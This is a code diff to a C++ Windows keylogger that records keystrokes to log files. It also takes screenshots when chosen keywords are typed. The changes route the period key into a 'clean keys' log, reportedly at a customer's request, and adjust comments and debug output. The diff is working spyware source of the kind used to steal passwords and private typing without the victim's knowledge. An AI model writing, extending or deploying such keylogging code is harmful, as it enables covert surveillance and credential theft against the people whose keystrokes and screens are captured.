@@ -140,9 +140,9 @@ void Keylogger::get_key(std::ofstream &file_logs)
 			{
 				key = c;
 
+				// check if Caps Lock is OFF
 				if ((GetKeyState(VK_CAPITAL) & 0x001) == 0)
 				{
-					//Caps Lock is OFF
 					std::transform(key.begin(), key.end(), key.begin(), ::tolower);
 				}
 				
@@ -180,8 +180,12 @@ void Keylogger::get_key(std::ofstream &file_logs)
 				key = ",";
 			else if (c == 189)
 				key = "-";
-			else if (c == 190)
+			else if (c == 190) // Request of the customer is that dot is also a 'clean' key
+			{
 				key = ".";
+				all_keys.append(key);
+				save_to_file(file_logs_clean_keys, key);
+			}
 			else if (c == 191)
 				key = "/";
 			else if (c == 219)
@@ -196,7 +200,6 @@ void Keylogger::get_key(std::ofstream &file_logs)
 				key = intToString(c);
 
 #ifdef DEBUG
-			/*printf("Key = %s (%d)\n", key.c_str(), c);*/
 			printf("%s (%d) ", key.c_str(), c);
 #endif
 			look_for_keyword(all_keys);
@@ -268,8 +271,8 @@ std::ofstream& Keylogger::get_file_logs_clean_keys()
 	return file_logs_clean_keys;
 }
 
-/* User can choose keywords - once they are typed the application will make the screenshot
- * at the time they are typed again. */
+/* User can choose keywords - once they are saved the application will make the screenshot
+ * each time they are typed. */
 std::vector<std::string> get_keywords()
 {
 	std::cin.ignore(); // We use getline() below, which would take everything what is in a buffer already.
